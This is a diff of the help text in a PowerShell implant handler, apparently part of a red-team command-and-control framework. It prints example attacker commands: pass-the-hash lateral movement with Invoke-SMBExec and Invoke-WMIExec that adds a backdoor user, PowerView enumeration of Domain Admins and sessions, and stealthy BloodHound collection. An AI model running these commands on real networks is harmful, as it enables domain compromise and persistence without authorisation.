@@ -182,9 +182,9 @@ function Implant-Handler
         write-host " Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash/-Pass -Command `"net user SMBExec Winter2017 /add`"" -ForegroundColor Green
         write-host " Invoke-WMIExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash/-Pass -Command `"net user SMBExec Winter2017 /add`"" -ForegroundColor Green
         write-host " Net View | Net Users | Whoami /groups | Net localgroup administrators | Net Accounts /dom" -ForegroundColor Green  
-        write-host ' Get-NetUser -Filter "(userprincipalname=*@testdomain.com)" | Select-Object samaccountname,userprincipalname' -ForegroundColor Green 
-        write-host ' Get-NetUser -Filter samaccountname=test}' -ForegroundColor Green 
-        write-host ' Get-NetUser | ?{$_.userprinciplename -match "test@test.com"}' -ForegroundColor Green 
+        write-host ' Get-NetUser -Filter | Select-Object samaccountname,userprincipalname' -ForegroundColor Green 
+        write-host ' Get-NetUser -Filter samaccountname=test' -ForegroundColor Green 
+        write-host ' Get-NetUser -Filter userprinciplename=test@test.com' -ForegroundColor Green 
         write-host ' Get-NetGroup -GroupName "Domain Admins" | %{ Get-NetUser $_.membername } | %{ $a=$_.displayname.split(" ")[0..1] -join " "; Get-NetUser -Filter "(displayname=*$a*)" } | Select-Object -Property displayname,samaccountname' -ForegroundColor Green 
         write-host ' Get-DomainGroupMember -Recurse "Domain Admins" | Select MemberName' -ForegroundColor Green
         write-host " Get-NetDomain | Get-NetDomainController | Get-NetDomainTrust" -ForegroundColor Green 
@@ -192,7 +192,6 @@ function Implant-Handler
         write-host ' Get-NetComputer | Select-String -pattern "Citrix" ' -ForegroundColor Green 
         write-host ' Get-NetGroup | Select-String -pattern "Internet" ' -ForegroundColor Green
         write-host " Get-BloodHoundData -CollectionMethod 'Stealth' | Export-BloodHoundCSV" -ForegroundColor Green
-        write-host " Get-BloodHoundData | Export-BloodHoundCSV" -ForegroundColor Green
         write-host " Get-NetDomainController | Select name | get-netsession | select *username,*CName" -ForegroundColor Green
         write-host " Get-DFSshare | get-netsession | Select *username,*CName" -ForegroundColor Green
         write-host " Get-NetFileServer | get-netsession | Select *username,*CName" -ForegroundColor Green
